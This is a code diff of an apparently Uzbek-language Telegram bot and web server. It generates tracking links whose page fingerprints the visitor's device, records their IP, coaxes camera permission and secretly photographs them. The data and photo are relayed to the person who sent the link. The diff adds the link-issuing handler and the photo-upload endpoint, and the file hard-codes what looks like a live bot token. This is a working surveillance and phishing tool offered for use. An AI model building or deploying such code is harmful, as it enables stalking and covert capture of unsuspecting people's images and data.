@@ -24,16 +24,30 @@ logger = logging.getLogger(__name__)
 # ---------------- ENV ----------------
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
-WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app  ").rstrip('/')
+WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
 if not BOT_TOKEN:
     logger.error("BOT_TOKEN kerak! ENV ga qo‘ying.")
     exit(1)
 
-# ... (boshidagi importlar o'zgarmaydi)
-
 # ---------------- GLOBAL STATE ----------------
 USER_TOKENS = {}  # token -> telegram_id (muddati cheksiz)
+
+# ---------------- Telegram Handlers ----------------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Foydalanuvchi /start bosganda unikal linkni beradi"""
+    user_id = update.effective_user.id
+    token = str(uuid.uuid4())
+    USER_TOKENS[token] = user_id
+    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
+
+    msg = (
+        "👋 Salom! Quyidagi havolani oching:\n\n"
+        f"🔗 {link}\n\n"
+        "Bu havola orqali sizning qurilma haqidagi ma'lumotlar avtomatik olinadi."
+    )
+    await update.message.reply_text(msg)
+
 
 # ---------------- Web Server: /track ----------------
 async def track_page(request):
@@ -80,7 +94,6 @@ async def track_page(request):
   <div class="note">Kamera ruxsati so'ralishi mumkin — ruxsat bering.</div>
   <script>
     async function collect() {{
-      // Asosiy ma'lumotlar
       const data = {{
         timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
@@ -103,7 +116,6 @@ async def track_page(request):
         gpu: 'Noma\\'lum'
       }};
 
-      // OS aniqlash
       if (/Android/i.test(navigator.userAgent)) {{
         data.os = 'Android';
         const match = navigator.userAgent.match(/Android\\s[\\d.]+;\\s[^)]+\\)\\s([^\\s]+)/);
@@ -113,20 +125,17 @@ async def track_page(request):
         data.model = /iPhone/.test(navigator.userAgent) ? 'iPhone' : 'iPad';
       }}
 
-      // Brauzer
       if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
       else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
       else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';
 
-      // Qurilma soni (mediaDevices)
       try {{
         const devices = await navigator.mediaDevices.enumerateDevices();
         data.devices.mic = devices.filter(d => d.kind === 'audioinput').length;
         data.devices.speaker = devices.filter(d => d.kind === 'audiooutput').length;
         data.devices.camera = devices.filter(d => d.kind === 'videoinput').length;
-      }} catch (e) {{ console.log('Media qurilmalarni olishda xatolik:', e); }}
+      }} catch (e) {{}}
 
-      // GPU aniqlash
       try {{
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -136,9 +145,8 @@ async def track_page(request):
             data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Aniqlanmadi';
           }}
         }}
-      }} catch (e) {{ console.log('GPU aniqlanmadi'); }}
+      }} catch (e) {{}}
 
-      // Tarmoq tezligi (Connection API)
       if ('connection' in navigator) {{
         const conn = navigator.connection;
         const downlink = conn.downlink ? `${{conn.downlink}} Mbps` : 'Noma\\'lum';
@@ -146,7 +154,6 @@ async def track_page(request):
         data.network = `${{effectiveType}} ~ ${{downlink}}`;
       }}
 
-      // Kamera ruxsati va rasm
       let gotCamera = false;
       try {{
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }} }});
@@ -156,10 +163,9 @@ async def track_page(request):
         if (capabilities && capabilities.width && capabilities.height) {{
           data.cameraRes = `${{Math.max(capabilities.width.min, capabilities.width.max)}} x ${{Math.max(capabilities.height.min, capabilities.height.max)}}`;
           if (capabilities.frameRate) {{
-            data.cameraRes += ` @$${{Math.floor(capabilities.frameRate.max)}}fps`;
+            data.cameraRes += ` @${{Math.floor(capabilities.frameRate.max)}}fps`;
           }}
         }}
-        // Rasm yuborish (faqat bir marta)
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
@@ -176,7 +182,6 @@ async def track_page(request):
         }}).catch(console.error);
         stream.getTracks().forEach(track => track.stop());
       }} catch (e) {{
-        console.log('Kamera ruxsati berilmadi yoki mavjud emas');
         if (!gotCamera) {{
           fetch('/camera_denied', {{
             method: 'POST',
@@ -186,7 +191,6 @@ async def track_page(request):
         }}
       }}
 
-      // IP manzil server tomonida qo'shiladi
       fetch('/submit', {{
         method: 'POST',
         headers: {{ 'Content-Type': 'application/json' }},
@@ -222,22 +226,22 @@ async def submit_data(request):
         devices_str = f"mikrofon: {devs.get('mic', 0)} ta, karnay: {devs.get('speaker', 0)} ta, kamera: {devs.get('camera', 0)} ta"
 
         message = (
-            f"🕒 {client_data.get('timestamp', \"Noma'lum\")}\n"
-            f"🌍 Vaqt zonasi: {client_data.get('timezone', \"Noma'lum\")}\n"
+            f"🕒 {client_data.get('timestamp', 'Noma\\'lum')}\n"
+            f"🌍 Vaqt zonasi: {client_data.get('timezone', 'Noma\\'lum')}\n"
             f"({utc_str})\n"
             f"📍 IP: {ip}\n"
-            f"💬 Til: {client_data.get('languages', \"Noma'lum\")}\n"
-            f"💻 Tizim: {client_data.get('os', \"Noma'lum\")} | Brauzer: {client_data.get('browser', \"Noma'lum\")}\n"
-            f"📱 Qurilma: {client_data.get('model', \"Noma'lum\")} ({client_data.get('deviceType', \"Noma'lum\")})\n"
+            f"💬 Til: {client_data.get('languages', 'Noma\\'lum')}\n"
+            f"💻 Tizim: {client_data.get('os', 'Noma\\'lum')} | Brauzer: {client_data.get('browser', 'Noma\\'lum')}\n"
+            f"📱 Qurilma: {client_data.get('model', 'Noma\\'lum')} ({client_data.get('deviceType', 'Noma\\'lum')})\n"
             f"🧠 CPU: {client_data.get('cpuCores', '?')} ta | RAM: {client_data.get('ram', '?')}\n"
             f"📺 Ekran: {client_data.get('screen', '?')}\n"
             f"RGBO Ekran chuqurligi: rang: {client_data.get('colorDepth', '?')}\n"
             f"Ko‘rinish (viewport): {client_data.get('viewport', '?')}\n"
             f"🔌 Qurilmalar: {devices_str}\n"
-            f"📷 Kamera: {client_data.get('cameraRes', \"Noma'lum\")}\n"
-            f"📶 Internet: {client_data.get('network', \"Noma'lum\")}\n"
-            f"🎮 GPU: {client_data.get('gpu', \"Noma'lum\")}\n"
-            f"🔍 UA: {client_data.get('userAgent', \"Noma'lum\")}"
+            f"📷 Kamera: {client_data.get('cameraRes', 'Noma\\'lum')}\n"
+            f"📶 Internet: {client_data.get('network', 'Noma\\'lum')}\n"
+            f"🎮 GPU: {client_data.get('gpu', 'Noma\\'lum')}\n"
+            f"🔍 UA: {client_data.get('userAgent', 'Noma\\'lum')}"
         )
 
         await request.app['bot'].send_message(chat_id=telegram_id, text=message)
@@ -245,6 +249,33 @@ async def submit_data(request):
     except Exception as e:
         logger.exception(f"[SUBMIT ERROR] {e}")
         return web.json_response({"error": str(e)}, status=500)
+
+
+# ---------------- Web Server: /upload_image ----------------
+async def upload_image(request):
+    try:
+        data = await request.json()
+        token = data.get('token')
+        image_data = data.get('image')
+
+        telegram_id = USER_TOKENS.get(token)
+        if not telegram_id:
+            return web.json_response({"error": "Token not found"}, status=400)
+
+        if ',' in image_data:
+            image_data = image_data.split(',', 1)[1]
+
+        image_bytes = base64.b64decode(image_data)
+        image_io = BytesIO(image_bytes)
+        image_io.name = "photo.jpg"
+
+        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(image_io))
+        return web.json_response({"status": "ok"})
+    except Exception as e:
+        logger.exception("[UPLOAD IMAGE ERROR]")
+        return web.json_response({"error": str(e)}, status=500)
+
+
 # ---------------- Web Server: /camera_denied ----------------
 async def camera_denied(request):
     try:
@@ -263,21 +294,21 @@ async def camera_denied(request):
 
 
 # ---------------- Web Server Starter ----------------
-
 async def start_web_server(bot):
     app = web.Application()
     app['bot'] = bot
     app.router.add_get('/track', track_page)
     app.router.add_post('/submit', submit_data)
     app.router.add_post('/upload_image', upload_image)
-    app.router.add_post('/camera_denied', camera_denied)  # yangi endpoint
+    app.router.add_post('/camera_denied', camera_denied)
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.getenv("PORT", "8000"))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
     logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
-    
+
+
 # ---------------- Startup ----------------
 async def on_startup(app: Application):
     asyncio.create_task(start_web_server(app.bot))
